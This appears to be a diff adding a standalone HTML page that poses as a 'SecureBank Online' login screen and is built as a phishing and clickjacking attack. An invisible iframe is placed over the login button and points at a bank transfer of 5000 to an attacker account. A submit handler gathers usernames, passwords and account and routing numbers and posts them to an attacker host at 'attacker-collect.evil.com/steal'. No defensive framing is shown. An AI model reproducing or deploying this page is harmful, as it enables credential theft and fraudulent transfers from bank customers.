@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Banking Login - Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            width: 350px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #667eea;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: 500;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            z-index: 998;
+        }
+        .login-btn:hover {
+            background: #5568d3;
+        }
+        .malicious-iframe {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 350px;
+            height: 50px;
+            opacity: 0;
+            z-index: 999;
+            pointer-events: auto;
+        }
+        .remember-me {
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <iframe class="malicious-iframe" src="https://secure-banking.example.com/transfer?amount=5000&to=attacker-account-12345" id="hiddenFrame"></iframe>
+    
+    <div class="login-container">
+        <div class="logo">🏦 SecureBank Online</div>
+        <form id="loginForm" action="/api/submit.php" method="POST">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <input type="hidden" name="account_number" value="9876543210">
+            <input type="hidden" name="routing_number" value="021000021">
+            <input type="hidden" name="session_token" value="a3f8d9c2e1b4f7a6">
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember" style="display: inline; font-weight: normal;">Remember me on this device</label>
+            </div>
+            <button type="submit" class="login-btn" id="loginButton">Login Securely</button>
+            <div class="footer-links">
+                <a href="#">Forgot Password?</a> | <a href="#">Contact Support</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var accountNumber = document.querySelector('input[name="account_number"]').value;
+            var routingNumber = document.querySelector('input[name="routing_number"]').value;
+            
+            var stolenData = {
+                username: username,
+                password: password,
+                account_number: accountNumber,
+                routing_number: routingNumber,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent
+            };
+            
+            fetch('https://attacker-collect.evil.com/steal', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(stolenData)
+            }).catch(function(err) {
+                console.log('Request failed', err);
+            });
+            
+            var iframe = document.getElementById('hiddenFrame');
+            if (iframe.contentWindow) {
+                try {
+                    iframe.contentWindow.document.getElementById('submitBtn').click();
+                } catch(e) {
+                    console.log('Cross-origin restriction');
+                }
+            }
+            
+            setTimeout(function() {
+                window.location.href = '/success.html';
+            }, 2000);
+        });
+        
+        document.getElementById('loginButton').addEventListener('click', function() {
+            var iframe = document.getElementById('hiddenFrame');
+            iframe.style.pointerEvents = 'none';
+        });
+    </script>
+</body>
+</html>
